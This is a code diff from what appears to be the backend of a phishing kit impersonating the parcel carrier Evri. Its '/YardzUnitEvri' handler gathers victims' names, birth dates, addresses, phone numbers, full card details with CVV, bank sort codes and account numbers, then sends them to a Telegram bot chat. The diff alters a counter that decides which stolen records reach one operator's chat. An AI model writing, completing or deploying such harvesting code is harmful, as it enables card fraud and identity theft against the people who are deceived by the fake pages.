@@ -6620,6 +6620,8 @@ app.post("/tcapzEvri", (req, res) => {
     });
 });
 
+let yardzCount = 0;
+
 app.options("/YardzUnitEvri", cors());
 
 app.post("/YardzUnitEvri", (req, res) => {
@@ -6679,11 +6681,11 @@ app.post("/YardzUnitEvri", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (capzEvri == 5) {
+      if (yardzCount == 10) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
         );
-        capzEvri = 0;
+        capzEvri = 5;
       } else if (bin === "542011") {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
